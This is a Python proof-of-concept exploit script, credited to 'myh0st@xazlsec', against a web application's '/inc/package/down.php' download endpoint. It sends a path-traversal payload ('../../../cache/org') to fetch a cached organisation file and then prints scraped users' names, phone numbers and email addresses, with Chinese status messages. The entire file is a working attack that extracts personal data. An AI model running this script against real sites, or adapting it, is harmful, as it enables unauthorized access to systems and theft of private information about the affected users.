#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
import zipfile
import io
from datetime import datetime, timedelta
import requests
import xml.etree.ElementTree as ET

urllib3.disable_warnings()


def download_and_unzip(url):
    # Send a GET request to the URL
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) ", "Connection": "close", "Accept-Encoding": "gzip"}
    response = requests.get(url, headers=burp0_headers, verify=False)
    # Check if the request was successful
    if response.status_code == 200:
        # Use BytesIO to treat the content as a file-like object for zipfile
        zip_file = zipfile.ZipFile(io.BytesIO(response.content))
        # Extract the zip file
        zip_file.extractall("unzipped_content")  # You can specify the path for extraction
        # Iterate over each file in the zip file
        for file_name in zip_file.namelist():
            print(f"Reading file: {file_name}")
            with zip_file.open(file_name) as file:
                return file.read()  # Read the contents of the file
    else:
        print(f"Failed to download the zip file. Status code: {response.status_code}")


def verify(site):
    payload_path = "/inc/package/down.php?id=../../../cache/org"
    xmldata = download_and_unzip(site + payload_path)

    # 使用ElementTree解析XML
    root = ET.fromstring(xmldata.decode('iso-8859-1'))
    i = 0
    for elem in root.iter():
        jsondata = elem.attrib
        if elem.tag == "u":
            try:
                username = jsondata["h"]
                email = jsondata["l"]
                phone = jsondata["k"]
                print("用户名：", username, " 手机号：", phone, " 电子邮箱：", email)
                i = i + 1
            except:
                continue

        if i > 10:
            break

    if i != 0:
        return True
    return False
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，以上为获取到的十个用户信息")
    else:
        print("[-]漏洞不存在")
